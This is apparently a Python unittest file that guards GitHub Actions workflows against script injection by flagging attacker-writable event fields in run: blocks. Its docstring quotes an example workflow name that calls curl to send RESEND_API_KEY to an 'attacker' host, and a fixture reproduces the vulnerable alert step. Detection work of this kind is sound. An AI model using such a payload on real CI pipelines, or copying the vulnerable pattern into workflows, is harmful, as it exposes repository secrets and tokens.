"""No workflow pastes an attacker-writable event field into a shell.

Found 2026-09-05 in the security review. `.github/workflows/ci-alert.yml`
listens on `workflow_run: workflows: ['*']`, which also fires for a fork PR's
own run, and its alert step interpolated `${{ github.event.workflow_run.name }}`
and `.head_branch` straight into a `run:` line. A fork chooses its workflow's
`name:` and its branch name, so `name: x$(curl attacker -d "$RESEND_API_KEY")`
would have executed on this repository's runner with RESEND_API_KEY and a
contents:write GITHUB_TOKEN in the environment. The step already had an `env:`
block; the fix was to put the six values there and read `"$RUN_WORKFLOW"`.

The rule this pins: an untrusted event field may be READ by `${{ }}` only into
`env:` (or `with:`), where the shell sees a value. Inside `run:` the expression
is substituted BEFORE the shell parses the line, so quoting cannot help, and
`"$VAR"` is the only safe shape. Static and offline: reads the YAML as text.

`inputs.*` is deliberately not on the list. `workflow_dispatch` inputs come from
write-access actors, which is the owner; several owner-only jobs use them.
"""
import re
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS = ROOT / ".github" / "workflows"
ACTIONS = ROOT / ".github" / "actions"

# Fields a fork, a commenter or an issue author writes without review.
UNTRUSTED = re.compile(
    r"\$\{\{[^}]*github\.event\.("
    r"workflow_run\.(name|display_title|head_branch|head_commit|head_repository|actor|triggering_actor)"
    r"|pull_request\.(title|body|head\.(ref|label|repo))"
    r"|head_commit\.(message|author)|commits"
    r"|issue\.(title|body)|comment\.body|review\.body|review_comment\.body"
    r"|discussion\.(title|body)"
    r")"
)

RUN_START = re.compile(r"^(\s*)(- )?run:\s*(\||>|\|-|>-)?\s*(.*)$")


def run_blocks(text):
    """Yield (first_line_no, block_text) for every `run:` in a workflow file."""
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        m = RUN_START.match(lines[i])
        if not m:
            i += 1
            continue
        indent = len(m.group(1)) + (2 if m.group(2) else 0)
        start = i
        body = [m.group(4)]
        if m.group(3):  # block scalar: everything more indented than `run:`
            j = i + 1
            while j < len(lines) and (lines[j].strip() == "" or len(lines[j]) - len(lines[j].lstrip()) > indent):
                body.append(lines[j])
                j += 1
            i = j
        else:
            i += 1
        yield start + 1, "\n".join(body)


def offending(path):
    hits = []
    for line_no, block in run_blocks(path.read_text(encoding="utf-8")):
        for m in UNTRUSTED.finditer(block):
            hits.append(f"{path.relative_to(ROOT)}:{line_no}: {m.group(0)}")
    return hits


class NoUntrustedEventFieldReachesAShell(unittest.TestCase):
    def files(self):
        found = sorted(WORKFLOWS.glob("*.yml")) + sorted(ACTIONS.glob("*/action.yml"))
        self.assertTrue(found, "no workflow files found")
        return found

    def test_no_run_block_interpolates_an_untrusted_field(self):
        hits = [h for f in self.files() for h in offending(f)]
        self.assertEqual(hits, [], "\n".join(
            ["An attacker-writable event field is pasted into a shell. Read it"
             " through env: and use \"$VAR\" in run: instead."] + hits))

    def test_the_scanner_sees_the_original_defect(self):
        # A guard's clean zero is worthless until it has caught the instance
        # it was written for: this is ci-alert.yml's alert step as shipped
        # before the fix, and the scanner must red it.
        bad = (
            "      - name: Alert\n"
            "        env:\n"
            "          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
            "        run: |\n"
            "          python3 railway/ci_alert.py \\\n"
            '            --workflow   "${{ github.event.workflow_run.name }}" \\\n'
            '            --branch     "${{ github.event.workflow_run.head_branch }}"\n'
        )
        hits = [m.group(0) for _, b in run_blocks(bad) for m in UNTRUSTED.finditer(b)]
        self.assertEqual(len(hits), 2, hits)

    def test_env_is_the_allowed_place(self):
        good = (
            "        env:\n"
            "          RUN_WORKFLOW: ${{ github.event.workflow_run.name }}\n"
            "        run: |\n"
            '          python3 railway/ci_alert.py --workflow "$RUN_WORKFLOW"\n'
        )
        hits = [m.group(0) for _, b in run_blocks(good) for m in UNTRUSTED.finditer(b)]
        self.assertEqual(hits, [])

    def test_ci_alert_reads_the_run_through_env(self):
        text = (WORKFLOWS / "ci-alert.yml").read_text(encoding="utf-8")
        for var in ("RUN_WORKFLOW", "RUN_BRANCH", "RUN_ID", "RUN_URL"):
            self.assertIn(f'"${var}"', text, f"ci-alert.yml no longer passes {var} from env")


if __name__ == "__main__":
    unittest.main()
